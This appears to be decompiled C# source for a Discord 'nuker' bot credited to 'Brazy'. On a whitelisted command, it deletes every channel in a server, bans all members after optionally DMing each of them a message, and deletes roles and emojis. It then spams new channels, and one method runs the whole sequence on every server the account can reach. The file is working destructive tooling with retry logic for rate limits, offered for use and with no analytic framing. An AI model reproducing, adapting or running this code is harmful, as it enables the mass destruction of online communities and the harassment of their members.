using System;
using System.Collections.Generic;
using System.Drawing;
using System.Threading;
using System.Threading.Tasks;
using Discord;
using Discord.Gateway;

namespace Quazide
{
	// Token: 0x02000002 RID: 2
	public static class Bot
	{
		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		// (set) Token: 0x06000002 RID: 2 RVA: 0x00002057 File Offset: 0x00000257
		public static Config Config { get; set; }

		// Token: 0x17000002 RID: 2
		// (get) Token: 0x06000003 RID: 3 RVA: 0x0000205F File Offset: 0x0000025F
		// (set) Token: 0x06000004 RID: 4 RVA: 0x00002066 File Offset: 0x00000266
		public static DiscordSocketClient Client { get; private set; }

		// Token: 0x17000003 RID: 3
		// (get) Token: 0x06000005 RID: 5 RVA: 0x0000206E File Offset: 0x0000026E
		// (set) Token: 0x06000006 RID: 6 RVA: 0x00002075 File Offset: 0x00000275
		public static bool BotAccount { get; private set; }

		// Token: 0x06000007 RID: 7 RVA: 0x00002080 File Offset: 0x00000280
		public static void Login()
		{
			Bot._guilds = new List<ulong>();
			Bot.Client = new DiscordSocketClient();
			Bot.Client.OnJoinedGuild += delegate(DiscordSocketClient client, GuildEventArgs args)
			{
				Bot._guilds.Add(args.Guild.Id);
			};
			Bot.Client.OnLoggedIn += Bot.OnLoggedIn;
			Bot.Client.OnMessageReceived += Bot.OnMessageReceived;
			Bot.Client.Login(Bot.Config.Token);
			while (!Bot.Client.LoggedIn)
			{
				Thread.Sleep(1);
			}
			Bot.BotAccount = (Bot.Client.User.Type == UserType.Bot);
			Console.Title = string.Format("GDK - By Brazy | Account: {0}{1}", Bot.Client.User, Bot.BotAccount ? " [BOT]" : "") + (Bot.Config.UseCommand ? (" | Nuke command: " + Bot.Config.Prefix + Bot.Config.Command) : "");
		}

		// Token: 0x06000008 RID: 8 RVA: 0x000021A8 File Offset: 0x000003A8
		private static void OnMessageReceived(DiscordSocketClient client, MessageEventArgs args)
		{
			bool flag = !Bot.Config.CmdWhitelist.Contains(args.Message.Author.User.Id);
			if (!flag)
			{
				bool flag2 = args.Message.GuildId == null;
				if (!flag2)
				{
					List<ulong> guilds = Bot._guilds;
					long value = (long)args.Message.GuildId.Value;
					bool flag3 = !guilds.Contains((ulong)value);
					if (!flag3)
					{
						string[] splitted = args.Message.Content.Split(new char[]
						{
							' '
						});
						bool flag4 = !(splitted[0] == Bot.Config.Prefix + Bot.Config.Command);
						if (!flag4)
						{
							Task.Run(delegate()
							{
								Bot.NukeGuild(args.Message.GuildId.Value, (splitted.Length <= 1 || !Bot.BotAccount) ? "" : string.Join(" ", splitted).Replace(splitted[0], ""));
							});
							EmbedMaker embedMaker = new EmbedMaker
							{
								Title = "GDK",
								Color = Color.FromArgb(255, 0, 0, 219),
								TitleUrl = "https://www.youtube.com/channel/UCjHoHJio4qqEZvj8pGQlteg",
								ImageUrl = "https://cdn.discordapp.com/attachments/677232312991219751/678794150400753694/tenor_4.gif",
								ThumbnailUrl = "https://cdn.discordapp.com/attachments/677232312991219751/678799529641771038/ezgif-6-6c0f5b1af841.gif"
							};
							embedMaker.Footer.Text = "Made by Brazy";
							embedMaker.Footer.IconUrl = "https://cdn.discordapp.com/attachments/677232312991219751/678798339508011078/image0.jpg";
						}
					}
				}
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002334 File Offset: 0x00000534
		private static void OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
		{
			Bot.Config.CmdWhitelist.Add(client.User.Id);
			bool flag = args.User.Type > UserType.User;
			if (!flag)
			{
				foreach (SocketGuild socketGuild in args.Guilds)
				{
					Bot._guilds.Add(socketGuild.Id);
				}
			}
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000023C0 File Offset: 0x000005C0
		public static void NukeGuild(ulong guildId, string dm)
		{
			bool flag = !Bot._guilds.Contains(guildId);
			if (flag)
			{
				Console.WriteLine("Guild was not found in the client's cached storage. Please try again");
				Console.ReadLine();
			}
			else
			{
				Guild guild = Bot.Client.GetGuild(guildId);
				Console.WriteLine("Nuking " + guild.Name + "...");
				Console.WriteLine("Deleting channels...");
				foreach (GuildChannel guildChannel in guild.GetChannels())
				{
					for (;;)
					{
						try
						{
							guildChannel.Delete();
							Console.WriteLine("Deleted channel " + guildChannel.Name);
							break;
						}
						catch (RateLimitException ex)
						{
							Thread.Sleep((int)ex.RetryAfter);
						}
						catch
						{
							Console.WriteLine("Failed to delete channel " + guildChannel.Name);
							break;
						}
					}
				}
				Console.WriteLine("Banning members...");
				IReadOnlyList<GuildMember> allGuildMembers = Bot.Client.GetAllGuildMembers(guildId);
				ParallelOptions parallelOptions = new ParallelOptions();
				parallelOptions.MaxDegreeOfParallelism = 4;
				Action<GuildMember> body = delegate(GuildMember member)
				{
					for (;;)
					{
						try
						{
							bool flag3 = !string.IsNullOrWhiteSpace(dm);
							if (flag3)
							{
								try
								{
									Bot.Client.CreateDM(member.User.Id).SendMessage(dm, false, null);
									Console.WriteLine(string.Format("DMed {0}", member.User));
								}
								catch
								{
									Console.WriteLine(string.Format("Failed to DM {0}", member.User));
								}
							}
							member.Ban("0", 7U);
							Console.WriteLine(string.Format("Banned {0}", member.User));
							break;
						}
						catch (RateLimitException ex4)
						{
							Thread.Sleep((int)ex4.RetryAfter);
						}
						catch
						{
							Console.WriteLine(string.Format("Failed to ban {0}", member.User));
							break;
						}
					}
				};
				Parallel.ForEach<GuildMember>(allGuildMembers, parallelOptions, body);
				Console.WriteLine("Deleting roles...");
				foreach (Role role in guild.Roles)
				{
					for (;;)
					{
						try
						{
							role.Delete();
							Console.WriteLine("Deleted role " + role.Name);
							break;
						}
						catch (RateLimitException ex2)
						{
							Thread.Sleep((int)ex2.RetryAfter);
						}
						catch
						{
							break;
						}
					}
				}
				Console.WriteLine("Deleting emojis...");
				foreach (Emoji emoji in guild.Emojis)
				{
					for (;;)
					{
						try
						{
							emoji.Delete();
							Console.WriteLine("Deleted emoji " + emoji.Name);
							break;
						}
						catch (RateLimitException ex3)
						{
							Thread.Sleep((int)ex3.RetryAfter);
						}
						catch
						{
							break;
						}
					}
				}
				List<ChannelType> list = new List<ChannelType>
				{
					ChannelType.Text,
					ChannelType.Voice,
					ChannelType.Category
				};
				int num = 0;
				for (int i = 0; i < Bot.Config.CreateChannelsAmount; i++)
				{
					try
					{
						guild.CreateChannel(Bot.Config.CreateChannelsName, list[num], null);
						num++;
						bool flag2 = num == list.Count;
						if (flag2)
						{
							num = 0;
						}
						Console.WriteLine(string.Format("Created channel {0}", i + 1));
					}
					catch
					{
						Console.WriteLine(string.Format("Failed to create channel {0}", i + 1));
					}
				}
				Console.WriteLine("Finished nuking " + guild.Name);
			}
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002768 File Offset: 0x00000968
		public static void NukeGuild(string dm)
		{
			foreach (ulong guildId in Bot._guilds)
			{
				Bot.NukeGuild(guildId, dm);
			}
		}

		// Token: 0x04000001 RID: 1
		private static List<ulong> _guilds;
	}
}
